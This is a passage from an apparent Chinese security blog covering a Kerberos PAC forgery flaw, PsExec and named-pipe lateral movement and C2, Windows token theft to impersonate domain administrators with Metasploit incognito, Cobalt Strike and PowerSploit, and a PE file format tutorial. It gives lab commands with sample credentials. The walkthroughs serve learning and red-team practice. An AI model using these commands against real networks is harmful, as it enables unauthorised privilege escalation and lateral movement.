<p><a href="https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#security-considerations">https://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#security-considerations</a></p>
<p>该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，<strong>它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的PAC</strong> 。</p>
<h4 id="漏洞三个成因："><a href="#漏洞三个成因：" class="headerlink" title="漏洞三个成因："></a>漏洞三个成因：</h4><ol>
<li><p>KDC对PAC进行验证时，对于PAC尾部的签名算法，虽然原理上规定必须是带有Key的签名算法才可以，但微软在实现上，却允许任意签名算法，只要客户端指定任意签名算法，KDC服务器就会使用指定的算法进行签名验证。因此伪造的任意内容都可以是合法的，直接加上内容的MD5值作为签名即可</p>
</li>
<li><p> PAC没有被放在TGT中，放在其它地方。KDC在仍然能够正确解析出没有放在TGT中的PAC信息，PAC必须是密文，经过Key加密的KDC会从Authenticator中取出来subkey，把PAC信息解密并利用客户端设定的签名算法验证签名</p>
</li>
<li><p>KDC验证缺少PAC的TGT成功后，再验证不在TGT中 的PAC的合法性。如果2个均验证成功，KDC把PAC中的User SID、Group SID取出来，重新使用进行签名，签名算法和密钥与设置inclue-pac标志位为TRUE时一模一样。将新产生的PAC加入到解密后的TGT中，再重新加密制作全新的TGT发送给Client，不是TGS</p>
</li>
</ol>
<p>至此，漏洞的原理大致了解，普通用户可以通过改变 PAC 的 TGT 来伪造票据获得管理员权限。</p>
<p>编写exp脚本的话无非就是按照这个思路，当然，我是废物，不会写exp，这里就画个大饼。</p>
<p><strong>生成一张TGT票据（此时没有伪造的PAC，为了给伪造的PAC腾出位置），伪造PAC，向TGS请求，此时返回的TGS票据（ST）里面就含有伪造的PAC</strong></p>
<p>简单分析到这，以后再补充.</p>
<p>如果哪里有错误，请大佬与我邮箱联系。</p>
<p>Peace</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>原理剖析</tag>
      </tags>
  </entry>
  <entry>
    <title>基于PSexec的一些原理分析</title>
    <url>/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-PSexec"><a href="#0x01-PSexec" class="headerlink" title="0x01 PSexec"></a>0x01 PSexec</h2><p>PsExec可以算是一个轻量级的 telnet 替代工具，无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如 ipconfig）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p>
<p>一般使用psexec用来横向移动，可以用来控制主机，条件是拥有被控主机的账户和密码.</p>
<p>psexec工具的使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec.exe \\目标IP –u administrator –p password</span><br></pre></td></tr></table></figure>

<p>建立PSexec的过程:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.通过ipc$连接，释放psexecsvc.exe到目标</span><br><span class="line">2.通过服务管理SCManager远程创建psexecsvc服务，并启动服务</span><br><span class="line">3.客户端连接执行命令，服务端启动相应的程序并执行回显数据</span><br><span class="line">4.运行完后删除服务</span><br><span class="line">！！！会产生大量日志，很容易被溯源</span><br><span class="line">5.在域环境测试时发现，⾮域⽤户⽆法利⽤内存中的票据使⽤ PSexec 功能，只能依靠账号和密码进⾏传递</span><br></pre></td></tr></table></figure>

<p>登录认证方式是 NTLM 认证，通过ipc（进程间通信）连接后，登录目标主机，连接admin$通道，向目标主机写入 <code>psexecsvc.exe</code> 文件到<code>C:\Windows\AppendData(或者WirteData</code> 目录下 ，接着使用IPC命名管道调用svcctl接口，用于开启远程服务<code>psexecsvc.exe</code>（ 用于在其他系统中远程执行命令），  最终创建服务后会建立4个命名管道。</p>
<p>因此，在使⽤ <code>Metasploit</code> 对⽬标进⾏ <code>Psexec</code> 的时候， payload ⼀定要使⽤正向 bind连接 ，因为目标是服务端，我们是客户端主动去连接服务端</p>
<p>而命名管道又是什么？</p>
<h2 id="0x02-命名管道"><a href="#0x02-命名管道" class="headerlink" title="0x02 命名管道"></a>0x02 命名管道</h2><p>管道: 管道是一个共享内存块，可用于通信和数据交换。管道是一个有两端的对象，一个进程向管道写入信息，另一个进程从管道读取信息。创建管道的进程称为管道服务端（只能在本地创建），连接管道的进程称为管道客户端。</p>
<p>特点:</p>
<p>基于smb协议通信，用于在两个进程之间传输数据，包括本地进程和远程进程，其客户端既可以接收数据也可以发送数据，服务器端也是可以接收数据，又可以发送数据。支持单向、双向通信。可以被任意符合权限要求的进程访问，</p>
<p>命名管道可以由 <code>CreateNamedPipeA</code>创建，接着客户端连接，然后实现读写操作</p>
<p>可以参考以下文档</p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea">创建命名网络功能 （winbase.h） - win32 应用程序|微软文档 (microsoft.com)</a></p>
<p>为什么要使用命名管道来建立网络通信呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为他走的是smb协议，也是tcp的一种。在Windows中，当尝试绑定一个tcp socket端口建立通信时，defender防火墙会警报，需要用户确认放行才可以，这没有高权限不就直接寄了。而命名管道利用了未加密的smb协议（445端口），在Windows中，通常是默认允许smb协议出入站的，所以命名管道经常被使用来绕过防火墙</span><br></pre></td></tr></table></figure>



<p>利用:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用模拟客户端功能获取system权限，eg：msf的getsystem功能</span><br><span class="line">作为c2通信</span><br><span class="line">本地权限提升</span><br></pre></td></tr></table></figure>

<p>msf中<code>getsystem</code>原理:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官方回答:</span><br><span class="line">creates a named pipe from Meterpreter. It also creates and runs a service that runs cmd.exe /c echo “some data” &gt;\.\pipe[random pipe here]. When the spawned cmd.exe connects to Meterpreter’s named pipe, Meterpreter has the opportunity to impersonate that security context. Impersonation of clients is a named pipes feature. The context of the service is SYSTEM, so when you impersonate it, you become SYSTEM.</span><br><span class="line"></span><br><span class="line">msf 会创建一个命名管道，然后创建一个服务去运行cmd.exe /c echo “some data” &gt;\\.\pipe\[random pipe here]，当 cmd 连接到 Meterpreter 的命名管道的时候，因为服务是 system 权限，msf 也就得到了一个 system 的 shell</span><br></pre></td></tr></table></figure>



<p>C2通信:</p>
<p><img src="/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20211110105758482.png" alt="image-20211110105758482"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个终端将为每个直接连接的子终端提供一个命名管道服务器和一个命名管道客户端。服务器监听管道名称，并等待客户端的连接。客户端连接到特定主机名和管道名称的服务器，从而创建命名管道。管道的每一个终端都有从另一个终端读取和写入的能力，即，将 Payload 运行（注入）后，创建了自定义命名管道（作服务端），等待连接即可，这一过程被称为Bind连接。</span><br><span class="line"></span><br><span class="line">这种连接方式很常见，如 Metasploit 和 Cobalt Strike 都有类似功能。</span><br></pre></td></tr></table></figure>



<h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><p>首先建立下ipc连接</p>
<p><img src="/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20211110120312544.png" alt="image-20211110120312544"></p>
<p><img src="/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20211110115836196.png" alt="image-20211110115836196"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec.exe -accepteula \\10.10.10.10 -s cmd.exe</span><br><span class="line"># -accepteula 第⼀次运⾏ PsExec 会弹出确认框，使⽤该参数就不会弹出确认框</span><br><span class="line"># -s以System权限运⾏远程进程，获得⼀个System权限的交互式Shell，如果不⽤这个参数，那么会获得⼀个administrator权限的shell</span><br></pre></td></tr></table></figure>

<p>system权限</p>
<p><img src="/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20211110115854129.png" alt="image-20211110115854129"></p>
<p>administrator权限</p>
<p><img src="/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20211110120524480.png" alt="image-20211110120524480"></p>
<p>在不建立ipc连接的前提下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec.exe \\10.10.10.11 -u redteam\administrator -p admin!@#456 -s cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20211110224732770.png" alt="image-20211110224732770"></p>
<p>在不想获得交互式shell的情况下，可以直接执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec.exe \\10.10.10.11 -u redteam\administrator -p admin!@#456 -s cmd /c &quot;ipconfig&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/15/PSexec%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20211110224130243.png" alt="image-20211110224130243"></p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>Token窃取那些事</title>
    <url>/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<p>Windows中的token可以用来做什么呢？</p>
<span id="more"></span>

<h4 id="Token简介"><a href="#Token简介" class="headerlink" title="Token简介"></a>Token简介</h4><p>Token 是描述进程或者线程上下文安全的一个对象。安全上下文包含了与该进程或线程的账户、组、特权有关的描述信息。Token还包含一些其他信息，如会话id、完整性级别以及UAC虚拟化状态。</p>
<p>不同的⽤户登录计算机后， 都会⽣成⼀个 Access Token ，这个 Token 在⽤户创建进程或者线程时会被使⽤，不断的拷贝，这也就解释了A⽤户创建⼀个进程而该进程没有B⽤户的权限。一般用户双击一个进程都会拷贝explorer.exe 的 Access Token</p>
<p>Windows有两种类型的Token：</p>
<ul>
<li>Delegation token(授权令牌): 用于交互会话登录(例如本地用户直接登录、远程桌面登录)</li>
<li>Impersonation token(模拟令牌): 用于非交互登录(利用net use访问共享文件夹)</li>
</ul>
<p><strong>注：</strong></p>
<p>两种token只在系统重启后清除；</p>
<p>具有<code>Delegation token(授权令牌)</code>的用户在注销后，该Token将变成<code>Impersonation token(模拟令牌)</code>，依旧有效</p>
<p>Windows有两种类型的Token：</p>
<ul>
<li>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</li>
<li>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</li>
</ul>
<p><strong>注：</strong></p>
<p>两种token只在系统重启后清除</p>
<p>具有<code>Delegation token</code>的用户在注销后，该Token将变成<code>Impersonation token</code>，依旧有效</p>
<p>可以这样理解：当前系统中的某个进程或者线程能访问什么样的系统资源，取决于当前令牌的权限</p>
<p>我们通过exp提权或者永恒之蓝等得到的权限即为System，假如我们利⽤mimikatz和hashdump不能获得 administrator⽤户的密码，那我们只能通过令牌窃取进⾏降权，获得administrator⽤户的shell， 从⽽以 administrator⽤户的身份启动某些服务 ( 某些服务只能通过administrator⽤户启动 )</p>
<h4 id="0x01-Metaspolit在token-窃取中的应用"><a href="#0x01-Metaspolit在token-窃取中的应用" class="headerlink" title="0x01 Metaspolit在token 窃取中的应用"></a>0x01 Metaspolit在token 窃取中的应用</h4><p>拿到了system权限</p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930085935251.png" alt="image-20210930085935251"></p>
<p>使用<code>incognito</code>模块</p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930090023888.png" alt="image-20210930090023888"></p>
<p>当前是system权限，可以查看到所有的用户token</p>
<p><code>list_tokens -u</code></p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930090155177.png" alt="image-20210930090155177"></p>
<p>可以窃取域管的token</p>
<p><code>impersonate_token &#39;SUN\Administrator&#39;</code></p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930090405386.png" alt="image-20210930090405386"></p>
<p>这个时候权限就已经是域管的权限，与域控建立IPC连接不需要密码（前提是可以IPC连接），</p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930090835081.png" alt="image-20210930090835081"></p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930090855787.png" alt="image-20210930090855787"></p>
<p>之后可以通过wmi执行命令，或者计划任务执行马子</p>
<p>返回之前的用户，可以使用命令：</p>
<p><code>rev2self</code></p>
<h4 id="0x02-Windows平台下incognito的应用"><a href="#0x02-Windows平台下incognito的应用" class="headerlink" title="0x02 Windows平台下incognito的应用"></a>0x02 Windows平台下incognito的应用</h4><p>下载地址: <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
<p>参考手册: <a href="http://labs.mwrinfosecurity.com/assets/142/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf">http://labs.mwrinfosecurity.com/assets/142/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf</a></p>
<p>常用命令：</p>
<p>列举token：<code>incognito.exe list_tokens -u</code></p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930091829175.png" alt="image-20210930091829175"></p>
<p>可以看到因为不是system权限，列举出的token很局限，切换到system权限看下</p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930092715995.png" alt="image-20210930092715995"></p>
<p>窃取token： <code>incognito.exe execute -c &quot;SUN\administrator&quot; cmd.exe</code></p>
<p>​                        <code>incognito.exe execute [options] &lt;token&gt; &lt;command&gt;</code></p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930093501547.png" alt="image-20210930093501547"></p>
<h4 id="0x03-CobaltStrike中的token窃取"><a href="#0x03-CobaltStrike中的token窃取" class="headerlink" title="0x03 CobaltStrike中的token窃取"></a>0x03 CobaltStrike中的token窃取</h4><p>可以注入到域管的进程中，前提是拿到一个system权限的becon</p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930093901267.png" alt="image-20210930093901267"></p>
<p>同样是域管的权限</p>
<p><img src="/2021/09/30/Token%E7%AA%83%E5%8F%96%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210930094204771.png" alt="image-20210930094204771"></p>
<p>为什么注入到域管的进程中就拥有了域管的权限呢？</p>
<p>这里又涉及到进程的完整性级别。</p>
<h4 id="0x04-Invoke-TokenManipulation-ps1用法"><a href="#0x04-Invoke-TokenManipulation-ps1用法" class="headerlink" title="0x04 Invoke-TokenManipulation.ps1用法"></a>0x04 Invoke-TokenManipulation.ps1用法</h4><p>下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a></p>
<p>原理和功能同incognito类似，能够实际提权和降权</p>
<p>列举token：<code>Invoke-TokenManipulation -Enumerate</code></p>
<p>提权至system：<code>Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot;</code></p>
<p>复制进程token：<code>Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ProcessId 500</code></p>
<p>复制线程token：<code>Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -ThreadId 500</code></p>
<h4 id="0x05-利用token拿下trust-installer-权限"><a href="#0x05-利用token拿下trust-installer-权限" class="headerlink" title="0x05 利用token拿下trust installer 权限"></a>0x05 利用token拿下trust installer 权限</h4><p>推荐文章：<a href="https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html">https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html</a></p>
<p>暂时咕咕咕了</p>
<p>关于Windows的安全机制，可以参考《深入解析Windows操作系统》第七章</p>
<p>Peace</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构</title>
    <url>/2021/08/28/PE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p>先来贴三张图</p>
<span id="more"></span>

<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/1.jpg" alt="1"></p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/2.jpg" alt="2"></p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/3.png" alt="3"></p>
<p>付上下载链接，附赠一张炒鸡详细图。</p>
<p>链接：<a href="https://pan.baidu.com/s/1RkqIDko51raMIsiRymtm9g">https://pan.baidu.com/s/1RkqIDko51raMIsiRymtm9g</a><br>提取码：l0j1</p>
<p>本文又臭又长，学起来挺枯燥的，不过PE倒是不难，坚持下去就好啦。</p>
<h2 id="基本名词解释"><a href="#基本名词解释" class="headerlink" title="基本名词解释"></a>基本名词解释</h2><p>为了更好的理解下图中的硬盘与内存映射结构图。</p>
<h4 id="基地址"><a href="#基地址" class="headerlink" title="基地址:"></a>基地址:</h4><p>PE文件通过Windows载入内存后,内存中的版本称为模块(Module). 映射文件的起始地址称为模块句柄(hModule),可以通过模块句柄访问内存中的其他数据.  这个初始内存地址就称为基地址(ImageBase).  基地址的值是由PE文件本身设定的. 按照默认设置  VC++ 创建的exe基地址为400000h ,  dll文件的基地址是10000000h.  可以在创建程序的exe文件时改变这个地址,  方法是在链接应用时 使用链接程序的 /BASE选项, 或者在链接后通过REBASE应用程序时进行设置.</p>
<p>基地址可以理解为 <strong>内存中整个PE文件的头地址</strong></p>
<h4 id="虚拟地址-Virtual-Address-VA"><a href="#虚拟地址-Virtual-Address-VA" class="headerlink" title="虚拟地址(Virtual Address,VA)"></a>虚拟地址(Virtual Address,VA)</h4><p>在Windows操作系统中, PE文件被系统加载器映射到内存中,每个程序都有自己的虚拟空间, 这个虚拟空间的内存地址 称为虚拟地址。</p>
<p>坦白来说就是内存中的地址。</p>
<h4 id="相对虚拟地址（Relative-Virtual-Address-，RVA）"><a href="#相对虚拟地址（Relative-Virtual-Address-，RVA）" class="headerlink" title="相对虚拟地址（Relative Virtual Address ，RVA）"></a>相对虚拟地址（Relative Virtual Address ，RVA）</h4><p>在可执行文件中，有许多地方需要指定内存中的地址。例如，引用全局变量时需要制定他的地址。PE文件尽管有一个首选的载入地址（基地址），但是他们可以载入进程空间的任何地方，所以不能依赖PE的载入点。因此，必须有一个方法来指定地址（不依赖PE载入点的地址）。</p>
<p>为了避免在PE文件中出现绝对内存地址引用了相对虚拟地址的概念。RVA只是内存中一个简单的、相对于PE文件载入地址的偏移位置，它是一个“相对地址”（或称偏移量）。例如，假设一个EXE文件从400000h处载入，而且它的代码区块开始于401000h处，代码区块的RVA计算方法如下：</p>
<p>​                                                                    目标地址401000h -  载入地址 400000h - RVA 1000h</p>
<p>即                                                                  虚拟地址（VA）= 基地址 （ImageBase）+ 相对虚拟地址 （RVA）</p>
<p>准确的说，RVA是当PE文件被装载到内存中后，某个数据位置相对于文件头的偏移量。举个栗子，如果Windows装载器将一个PE文件装入到 00400000h处的内存中，而某个区块中的某个数据被装入 0040xxxxh处 ，那么这个数据的RVA 就是（0040xxxxh - 00400000h ）= xxxxh，反过来说，将RVA的值加上文件被装载的基地址，就可以找到数据在内存中的实际地址。</p>
<p>小结一下，VA是进程虚拟内存的绝对地址，RVA是指从某基准位置开始的相对地址。</p>
<h4 id="文件偏移地址（Offset）"><a href="#文件偏移地址（Offset）" class="headerlink" title="文件偏移地址（Offset）"></a>文件偏移地址（Offset）</h4><p>当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址（FIle Offset）或物理地址（Raw Offset）。文件偏移地址从PE文件的第1个字节开始计数，起始值为0。 用16进制工具（Winhex等） 打开文件时所显示的地址就是文件偏移地址。</p>
<p>​        </p>
<p>​                                                    <strong>Offset = RVA - ImageBase - 节偏移</strong></p>
<h2 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h2><p>PE文件使用的是一个平面地址空间，所有代码和数据都合并在-起，组成了一个很大的结构。文件的内容被分割为不同的区块( Section，又称区段、节等，在本章中不区分“区块”与“块”), 区块中包含代码或数据，各个区块按页边界对齐。区块没有大小限制，是-一个连续结构。每个块都有它自己在内存中的一套属性，例如这个块是否包含代码、是否只读或可读/写等。认识到PE文件不是作为单- -内存映射文件被载人内存是很重要的。Windows 加载器(又称PE装载器)遍历PE文件并决定文件的哪一部分被映射， 这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。</p>
<p>磁盘文件一 旦被载人内存,磁盘上的数据结构布局和内存中的数据结构布局就是一致的。这样，如果在磁盘的数据结构中寻找一些内容，那么几乎都能在被载人的内存映射文件中找到相同的信息，但数据之间的相对位置可能会改变，某项的偏移地址可能区别于原始的偏移位置。<br>不管怎样，对所有表现出来的信息，都允许进行从磁盘文件偏移到内存偏移的转换。</p>
<p>PE(Portable Execute)文件是Windows操作系统可执行文件的总称，常见的有exe，dll，ocx，sys等。PE文件是指32位可执行文件，也称为PE32。**64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式（请注意不是PE64)**。</p>
<p>其实PE文件可以是任何后缀，辨识一个文件是不是PE文件，看它是否具有指纹就好了。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826161616288.png" alt="image-20210826161616288"></p>
<p>如图所示，4D 5A 对应的就是MZ ，是DOS头部，而50 45 对应的PE，是PE文件头。有这两个就可以确定是PE文件格式了。</p>
<p>首先介绍一下PE基本结构</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826162755371.png" alt="image-20210826162755371"></p>
<p>PE结构整体上可以分为：</p>
<ol>
<li>Dos部分 </li>
<li>NT头 : 包含Windows PE文件的主要信息,包括一个’PE’字样的签名,PE文件头(IMAGE_FILE_HEADER) 和 PE可选头(IMAGE_OPTIONAL_HEADER32)</li>
<li>节表(区块表)</li>
<li>节数据(区块数据)</li>
<li>调试信息</li>
</ol>
<h2 id="DOS部分"><a href="#DOS部分" class="headerlink" title="DOS部分"></a>DOS部分</h2><p>DOS部分主要是为了兼容以前的MS_DOS系统，DOS部分可以分为DOS MZ文件头(IMAGE_DOS_HEADER)和DOS块(DOS Stub)组成，PE文件的第一个字节位于一个传统的MS-DOS头部，称作IMAGE_DOS_HEADER，其结构如下：</p>
<p>大小64个字节</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      </span><br><span class="line">  +<span class="number">0</span>h 	 WORD   e_magic;                     <span class="comment">//DOS可执行文件标记&quot;MZ&quot;</span></span><br><span class="line">  +<span class="number">2</span>h  	 WORD   e_cblp;                      </span><br><span class="line">  +<span class="number">4</span>h  	 WORD   e_cp;                       </span><br><span class="line">  +<span class="number">6</span>h  	 WORD   e_crlc;                     </span><br><span class="line">  +<span class="number">8</span>h    WORD   e_cparhdr;                   </span><br><span class="line">  +<span class="number">0</span>ah   WORD   e_minalloc;                 </span><br><span class="line">  +<span class="number">0</span>ch   WORD   e_maxalloc;                 </span><br><span class="line">  +<span class="number">0</span>eh   WORD   e_ss;                        </span><br><span class="line">  +<span class="number">10</span>h   WORD   e_sp;                     </span><br><span class="line">  +<span class="number">12</span>h   WORD   e_csum;                      </span><br><span class="line">  +<span class="number">14</span>h   WORD   e_ip;                        <span class="comment">//DOS代码入口ip</span></span><br><span class="line">  +<span class="number">16</span>h   WORD   e_cs;                        <span class="comment">//DOS代码入口cs</span></span><br><span class="line">  +<span class="number">18</span>h   WORD   e_lfarlc;                   </span><br><span class="line">  +<span class="number">1</span>ah   WORD   e_ovno;                     </span><br><span class="line">  +<span class="number">1</span>ch   WORD   e_res[<span class="number">4</span>];                 </span><br><span class="line">  +<span class="number">24</span>h   WORD   e_oemid;                 </span><br><span class="line">  +<span class="number">26</span>h   WORD   e_oeminfo;                </span><br><span class="line">  +<span class="number">28</span>h   WORD   e_res2[<span class="number">10</span>];                 </span><br><span class="line">  +<span class="number">3</span>ch	 DWORD  e_lfanew;                  <span class="comment">//指向PE文件头&quot;PE&quot;，0，0 </span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>



<p>比较重要的字段就两个。</p>
<h5 id="e-magic："><a href="#e-magic：" class="headerlink" title="e_magic："></a>e_magic：</h5><p>DOS可执行文件标识 。，其值为5A4D。  这个值有一个#define,名为IMAGE_DOS_SIGNATURE,在ASCII表里值为MZ。</p>
<h5 id="e-lfanew"><a href="#e-lfanew" class="headerlink" title="e_lfanew:"></a>e_lfanew:</h5><p> 是PE文件头的相对偏移地址(RVA ),指出真正的PE头的文件偏移位置,占用4字节,位于从文件开始偏移3ch处</p>
<p>说白了就是 指向pe文件头的32位的指针  （告诉了我们pe头在哪）</p>
<p>下面来分析一下:</p>
<p>偏移3c,找到3c处,大小4个字节,按照Intel的小端模式读取的话,字符存储时低位在前,高位在后,所以将次序恢复后,e_lfanew的值就是40,说明40开始就是PE文件头的偏移量,上文也提到40处的值是45 50 h,就是PE.</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826170414922.png" alt="image-20210826170414922"></p>
<p>DOS头部最重要的就是这两个字段,其余中间的部分都是由链接器所写入,可以随意修改,不影响程序的运行.emmmmm,思路是不是可以扩展一下下…..</p>
<h2 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h2><p>PE Header  是 PE相关结构NT 映像头（IMAGE_NT_HEADERS）的简称，其中包含许多PE装载器能用到的重要字段。PE文件头由PE文件头标志，标准PE头，扩展PE头三部分组成。PE文件头标志即 “50 45 00 00 ” </p>
<p>PE文件头：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">  +<span class="number">0</span>h  	DWORD 						Signature; 						<span class="comment">//PE文件头标志 =&gt; 4字节</span></span><br><span class="line">  +<span class="number">4</span>h  	IMAGE_FILE_HEADER   		FileHeader; 					<span class="comment">//标准PE头 =&gt; 20字节</span></span><br><span class="line">  +<span class="number">18</span>h  IMAGE_OPTIONAL_HEADER32 	OptionalHeader; 				<span class="comment">//扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>



<h4 id="Signature字段"><a href="#Signature字段" class="headerlink" title="Signature字段"></a>Signature字段</h4><p>在PE文件中，Signture 字段被设置为 00004550h，ASCII码字符是“PE00”，就是PE文件头的开始。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826182814549.png" alt="image-20210826182814549"></p>
<h4 id="IMAGE-FILE-HEADER（标准PE头）："><a href="#IMAGE-FILE-HEADER（标准PE头）：" class="headerlink" title="IMAGE_FILE_HEADER（标准PE头）："></a>IMAGE_FILE_HEADER（标准PE头）：</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line"> +<span class="number">04</span>h   WORD    Machine; 				<span class="comment">//运行平台</span></span><br><span class="line"> +<span class="number">06</span>h   WORD    NumberOfSections; 		<span class="comment">//文件的区块数（节的数量）</span></span><br><span class="line"> +<span class="number">08</span>h   DWORD   TimeDateStamp; 			<span class="comment">//编译器填写的时间戳</span></span><br><span class="line"> +<span class="number">0</span>ch   DWORD   PointerToSymbolTable;   <span class="comment">//指向符号表（调试）</span></span><br><span class="line"> +<span class="number">10</span>h   DWORD   NumberOfSymbols; 		<span class="comment">//符号表中符号的个数（调试）</span></span><br><span class="line"> +<span class="number">14</span>h   WORD    SizeOfOptionalHeader;   <span class="comment">//标识扩展PE头（IMAGE_OPTIONAL_HEADER32）大小</span></span><br><span class="line"> +<span class="number">16</span>h   WORD    Characteristics;        <span class="comment">//文件属性 =&gt; 16进制转换为2进制根据哪些位有1,可以查看相关属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>



<p>说一下比较重要的字段。</p>
